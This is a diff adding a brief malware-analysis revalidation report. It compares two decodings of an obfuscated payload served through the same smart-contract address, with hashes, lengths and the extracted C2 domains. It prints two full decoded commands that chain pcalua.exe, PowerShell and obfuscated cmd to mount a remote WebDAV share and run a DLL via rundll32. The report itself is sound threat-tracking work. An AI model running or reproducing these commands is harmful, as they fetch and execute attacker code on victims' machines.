@@ -1,0 +1,16 @@
+=== ORIGINAL artifact (report.md analysis time) ===
+  outer_len=60104  outer_sha256=6d59ce890a4e9552b5451a3e6a1c72bbee95b9c778ebc933f03ec9ea38eb82a7
+  inner_len=45076  inner_sha256=e9559ab2d9dc85f36cf44bc39b065ebe76306adea86aaf3c1c2cab3fdaa68733
+  max atob() nesting depth unwrapped: 1
+  domains_found: ['behtarin-site-shartbandi.com']
+  command_found: pcalua.exe -a "powershell.exe" -c "saps cmd '/v/c set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x \\{random8}.behtarin-site-shartbandi.com@SSL\${uuid__} & !c!!d! gc.key,#1' -WI MIn"
+
+=== FRESH fetch (this revalidation, 2026-07-15) ===
+  outer_len=59648  outer_sha256=4bc327db0435d865c56ab593cf2a1d6b49701e766daa4b9c5c505398fba30707
+  inner_len=44736  inner_sha256=d44b7de5ccc40a9eb170ed5476aa14fc3876d2d07d6e7f8c4bab39415f268ef2
+  max atob() nesting depth unwrapped: 1
+  domains_found: ['site-shartbandi-farsi.com']
+  command_found: pcalua.exe -a "powershell.exe" -c "saps cmd '/v/c set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x \\{random8}.site-shartbandi-farsi.com@SSL\${uuid__} & !c!!d! gc.key,#1' -WI MIn"
+
+SAME CONTRACT ADDRESS (0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff) - outer bytes identical: False
+CONCLUSION: CONFIRMED ROTATION - the same contract address now returns different, independently-decodable content with a different embedded C2 domain.
